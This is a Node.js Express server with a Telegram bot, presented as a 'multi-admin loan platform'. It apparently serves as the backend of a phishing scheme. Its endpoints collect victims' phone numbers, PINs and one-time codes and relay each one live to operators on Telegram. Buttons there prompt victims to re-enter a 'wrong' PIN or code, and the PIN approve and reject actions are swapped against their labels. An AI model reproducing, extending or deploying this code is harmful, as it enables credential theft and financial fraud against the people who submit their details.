const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const db = require('./database');

const app = express();

// ==========================================
// ✅ WEBHOOK MODE FOR RENDER (NOT POLLING!)
// ==========================================

const BOT_TOKEN = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || `https://final-8xfd.onrender.com`;

// ✅ Create bot WITHOUT polling
const bot = new TelegramBot(BOT_TOKEN);

// Store admin chat IDs
const adminChatIds = new Map();

let dbReady = false;

(async () => {
    try {
        await db.connectDatabase();
        dbReady = true;
        console.log('✅ Database ready!');
        
        // Load admin chat IDs from database
        await loadAdminChatIds();
        
        // Setup bot handlers
        setupBotHandlers();
        
        // ✅ SETUP WEBHOOK (This is the key fix!)
        const webhookPath = `/telegram-webhook/${BOT_TOKEN}`;
        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        
        await bot.setWebHook(fullWebhookUrl);
        console.log(`🤖 Webhook set to: ${fullWebhookUrl}`);
        
        // Setup webhook endpoint
        app.use(bot.webhookCallback(webhookPath));
        
    } catch (error) {
        console.error('❌ Initialization failed:', error);
        process.exit(1);
    }
})();

// ✅ Load admin chat IDs
async function loadAdminChatIds() {
    const admins = await db.getAllAdmins();
    console.log(`📋 Loading ${admins.length} admins...`);
    
    for (const admin of admins) {
        if (admin.status === 'active' && admin.chatId) {
            adminChatIds.set(admin.adminId, admin.chatId);
            console.log(`✅ Loaded: ${admin.name} (${admin.adminId})`);
        }
    }
    
    console.log(`✅ ${adminChatIds.size} admins ready!`);
}

// Middleware
app.use(express.json());
app.use(express.static(__dirname));

app.use((req, res, next) => {
    if (!dbReady && !req.path.includes('/health')) {
        return res.status(503).json({ 
            success: false, 
            message: 'Database not ready yet' 
        });
    }
    next();
});

// ==========================================
// ✅ BOT HANDLERS
// ==========================================

function setupBotHandlers() {
    // Start command
    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        
        // Find if this chat ID belongs to an admin
        let adminId = null;
        for (const [id, storedChatId] of adminChatIds.entries()) {
            if (storedChatId === chatId) {
                adminId = id;
                break;
            }
        }
        
        if (adminId) {
            const admin = await db.getAdmin(adminId);
            bot.sendMessage(chatId, `
👋 *Welcome ${admin.name}!*

*Your Admin ID:* \`${adminId}\`
*Your Personal Link:*
${process.env.APP_URL || WEBHOOK_URL}?admin=${adminId}

*Commands:*
/mylink - Get your link
/stats - Your statistics
/pending - Pending applications
/myinfo - Your information
            `, { parse_mode: 'Markdown' });
        } else {
            bot.sendMessage(chatId, `
👋 *Welcome!*

Your Chat ID: \`${chatId}\`

Provide this to your super admin for access.
            `, { parse_mode: 'Markdown' });
        }
    });

    // My link
    bot.onText(/\/mylink/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        
        if (!adminId) {
            bot.sendMessage(chatId, '❌ Not registered as admin.');
            return;
        }
        
        const admin = await db.getAdmin(adminId);
        bot.sendMessage(chatId, `
🔗 *YOUR LINK*

\`${process.env.APP_URL || WEBHOOK_URL}?admin=${adminId}\`

📋 Applications → *${admin.name}*
        `, { parse_mode: 'Markdown' });
    });

    // Stats
    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        
        if (!adminId) {
            bot.sendMessage(chatId, '❌ Not registered as admin.');
            return;
        }
        
        const stats = await db.getAdminStats(adminId);
        
        bot.sendMessage(chatId, `
📊 *STATISTICS*

📋 Total: ${stats.total}
⏳ PIN Pending: ${stats.pinPending}
✅ PIN Approved: ${stats.pinApproved}
⏳ OTP Pending: ${stats.otpPending}
🎉 Fully Approved: ${stats.fullyApproved}
        `, { parse_mode: 'Markdown' });
    });

    // Pending
    bot.onText(/\/pending/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        
        if (!adminId) {
            bot.sendMessage(chatId, '❌ Not registered as admin.');
            return;
        }
        
        const adminApps = await db.getApplicationsByAdmin(adminId);
        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.pinStatus === 'approved');
        
        let message = `⏳ *PENDING*\n\n`;
        
        if (pinPending.length > 0) {
            message += `📱 *PIN (${pinPending.length}):*\n`;
            pinPending.forEach((app, i) => {
                message += `${i + 1}. ${app.phoneNumber} - \`${app.id}\`\n`;
            });
            message += '\n';
        }
        
        if (otpPending.length > 0) {
            message += `🔢 *OTP (${otpPending.length}):*\n`;
            otpPending.forEach((app, i) => {
                message += `${i + 1}. ${app.phoneNumber} - OTP: \`${app.otp}\`\n`;
            });
        }
        
        if (pinPending.length === 0 && otpPending.length === 0) {
            message = '✨ No pending applications!';
        }
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    // My info
    bot.onText(/\/myinfo/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        
        if (!adminId) {
            bot.sendMessage(chatId, '❌ Not registered as admin.');
            return;
        }
        
        const admin = await db.getAdmin(adminId);
        
        bot.sendMessage(chatId, `
ℹ️ *YOUR INFO*

👤 ${admin.name}
📧 ${admin.email}
🆔 \`${adminId}\`
💬 \`${chatId}\`
📅 ${new Date(admin.createdAt).toLocaleString()}
✅ ${admin.status}

🔗 ${process.env.APP_URL || WEBHOOK_URL}?admin=${adminId}
        `, { parse_mode: 'Markdown' });
    });

    // Callback queries
    bot.on('callback_query', async (callbackQuery) => {
        await handleCallback(callbackQuery);
    });

    console.log('✅ Bot handlers configured!');
}

// Helper to get adminId from chatId
function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) {
            return adminId;
        }
    }
    return null;
}

// Send message to specific admin
async function sendToAdmin(adminId, message, options = {}) {
    const chatId = adminChatIds.get(adminId);
    
    if (!chatId) {
        console.error(`❌ No chat ID for admin: ${adminId}`);
        return null;
    }
    
    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ Error sending to ${adminId}:`, error.message);
        return null;
    }
}

// ==========================================
// CALLBACK HANDLER
// ==========================================

async function handleCallback(callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const adminId = getAdminIdByChatId(chatId);
    
    if (!adminId) {
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '❌ Not authorized!',
            show_alert: true
        });
        return;
    }
    
    if (data.startsWith('wrongpin_otp_')) {
        const applicationId = data.replace('wrongpin_otp_', '');
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
        
        await bot.editMessageText(`
❌ *WRONG PIN AT OTP STAGE*

📋 \`${applicationId}\`
📱 ${application.phoneNumber}
🔢 \`${application.otp}\`

⚠️ User's PIN was incorrect
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ User will re-enter PIN' });
        return;
    }
    
    if (data.startsWith('wrongcode_otp_')) {
        const applicationId = data.replace('wrongcode_otp_', '');
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
        
        await bot.editMessageText(`
❌ *WRONG CODE*

📋 \`${applicationId}\`
📱 ${application.phoneNumber}
🔢 \`${application.otp}\`

⚠️ Wrong verification code
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ User will re-enter code' });
        return;
    }
    
    if (data.startsWith('approve_pin_')) {
        const applicationId = data.replace('approve_pin_', '');
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
        
        await bot.editMessageText(`
❌ *DENIED*

📋 \`${applicationId}\`
📱 ${application.phoneNumber}
🔑 \`${application.pin}\`

⚠️ REJECTED
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Denied' });
        return;
    }
    
    if (data.startsWith('reject_pin_')) {
        const applicationId = data.replace('reject_pin_', '');
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        await db.updateApplication(applicationId, { pinStatus: 'approved' });
        
        await bot.editMessageText(`
✅ *PIN APPROVED*

📋 \`${applicationId}\`
📱 ${application.phoneNumber}
🔑 \`${application.pin}\`

✅ Awaiting OTP
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved' });
        return;
    }
    
    if (data.startsWith('approve_otp_')) {
        const applicationId = data.replace('approve_otp_', '');
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        await db.updateApplication(applicationId, { otpStatus: 'approved' });
        
        await bot.editMessageText(`
🎉 *LOAN APPROVED!*

📋 \`${applicationId}\`
📱 ${application.phoneNumber}
🔑 \`${application.pin}\`
🔢 \`${application.otp}\`

✅ FULLY APPROVED
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Approved!' });
        return;
    }
}

// ==========================================
// API ENDPOINTS
// ==========================================

app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
        const applicationId = `APP-${Date.now()}`;
        
        let assignedAdmin;
        
        if (assignmentType === 'specific' && requestAdminId) {
            assignedAdmin = await db.getAdmin(requestAdminId);
            if (!assignedAdmin || assignedAdmin.status !== 'active') {
                return res.status(400).json({ success: false, message: 'Invalid admin' });
            }
        } else {
            const activeAdmins = await db.getActiveAdmins();
            if (activeAdmins.length === 0) {
                return res.status(503).json({ success: false, message: 'No admins' });
            }
            
            const adminStats = await Promise.all(
                activeAdmins.map(async (admin) => {
                    const stats = await db.getAdminStats(admin.adminId);
                    return { admin, pending: stats.pinPending + stats.otpPending };
                })
            );
            
            adminStats.sort((a, b) => a.pending - b.pending);
            assignedAdmin = adminStats[0].admin;
        }
        
        if (!adminChatIds.has(assignedAdmin.adminId)) {
            return res.status(503).json({ success: false, message: 'Admin not connected' });
        }
        
        await db.saveApplication({
            id: applicationId,
            adminId: assignedAdmin.adminId,
            adminName: assignedAdmin.name,
            phoneNumber,
            pin,
            pinStatus: 'pending',
            otpStatus: 'pending',
            assignmentType: assignmentType || 'auto',
            timestamp: new Date().toISOString()
        });
        
        await sendToAdmin(assignedAdmin.adminId, `
📱 *NEW APPLICATION*

📋 \`${applicationId}\`
📱 ${phoneNumber}
🔑 \`${pin}\`
⏰ ${new Date().toLocaleString()}

⚠️ *VERIFY INFORMATION*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Invalid - Deny', callback_data: `approve_pin_${applicationId}` }],
                    [{ text: '✅ Correct - Allow OTP', callback_data: `reject_pin_${applicationId}` }]
                ]
            }
        });
        
        console.log(`📤 → ${assignedAdmin.name}`);
        
        res.json({ 
            success: true, 
            applicationId,
            assignedTo: assignedAdmin.name,
            assignedAdminId: assignedAdmin.adminId
        });
        
    } catch (error) {
        console.error('❌ Error:', error);
        res.status(500).json({ success: false, message: 'Failed' });
    }
});

app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    const application = await db.getApplication(req.params.applicationId);
    
    if (application) {
        res.json({ success: true, status: application.pinStatus });
    } else {
        res.status(404).json({ success: false, message: 'Not found' });
    }
});

app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        const application = await db.getApplication(applicationId);
        
        if (!application) {
            return res.status(404).json({ success: false, message: 'Not found' });
        }
        
        if (!adminChatIds.has(application.adminId)) {
            return res.status(500).json({ success: false, message: 'Admin unavailable' });
        }
        
        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });
        
        await sendToAdmin(application.adminId, `
📲 *CODE VERIFICATION*

📋 \`${applicationId}\`
📱 ${application.phoneNumber}
🔢 \`${otp}\`
⏰ ${new Date().toLocaleString()}

⚠️ *VERIFY CODE*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong PIN', callback_data: `wrongpin_otp_${applicationId}` }],
                    [{ text: '❌ Wrong Code', callback_data: `wrongcode_otp_${applicationId}` }],
                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${applicationId}` }]
                ]
            }
        });
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, message: 'Failed' });
    }
});

app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    const application = await db.getApplication(req.params.applicationId);
    
    if (application) {
        res.json({ success: true, status: application.otpStatus });
    } else {
        res.status(404).json({ success: false, message: 'Not found' });
    }
});

app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        const application = await db.getApplication(applicationId);
        
        if (!application) {
            return res.status(404).json({ success: false, message: 'Not found' });
        }
        
        if (!adminChatIds.has(application.adminId)) {
            return res.status(500).json({ success: false, message: 'Admin unavailable' });
        }
        
        await sendToAdmin(application.adminId, `
🔄 *OTP RESEND*

📋 \`${applicationId}\`
📱 ${application.phoneNumber}

User requested OTP resend.
        `, { parse_mode: 'Markdown' });
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, message: 'Failed' });
    }
});

app.get('/api/admins', async (req, res) => {
    const admins = await db.getActiveAdmins();
    const adminList = admins.map(admin => ({
        id: admin.adminId,
        name: admin.name,
        email: admin.email,
        status: admin.status
    }));
    
    res.json({ success: true, admins: adminList });
});

app.get('/api/validate-admin/:adminId', async (req, res) => {
    const admin = await db.getAdmin(req.params.adminId);
    
    if (admin && admin.status === 'active') {
        res.json({ 
            success: true, 
            valid: true,
            admin: {
                id: admin.adminId,
                name: admin.name,
                email: admin.email
            }
        });
    } else {
        res.json({ 
            success: true, 
            valid: false,
            message: 'Admin not found'
        });
    }
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        database: dbReady ? 'connected' : 'not ready',
        activeAdmins: adminChatIds.size,
        botMode: 'webhook',
        webhookUrl: `${WEBHOOK_URL}/telegram-webhook/${BOT_TOKEN}`,
        timestamp: new Date().toISOString()
    });
});

app.get('/admin-select', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin-select.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ==========================================
// SERVER
// ==========================================

app.listen(PORT, () => {
    console.log(`\n👑 MULTI-ADMIN LOAN PLATFORM`);
    console.log(`============================`);
    console.log(`🌐 Server: http://localhost:${PORT}`);
    console.log(`🤖 Bot: WEBHOOK MODE ✅`);
    console.log(`👥 Admins: ${adminChatIds.size}`);
    console.log(`\n✅ Ready!\n`);
});

async function shutdownGracefully() {
    console.log('🛑 Shutting down...');
    await bot.deleteWebHook();
    await db.closeDatabase();
    console.log('✅ Done');
    process.exit(0);
}

process.on('SIGTERM', shutdownGracefully);
process.on('SIGINT', shutdownGracefully);

process.on('unhandledRejection', (error) => {
    console.error('Unhandled rejection:', error);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught exception:', error);
    shutdownGracefully();
});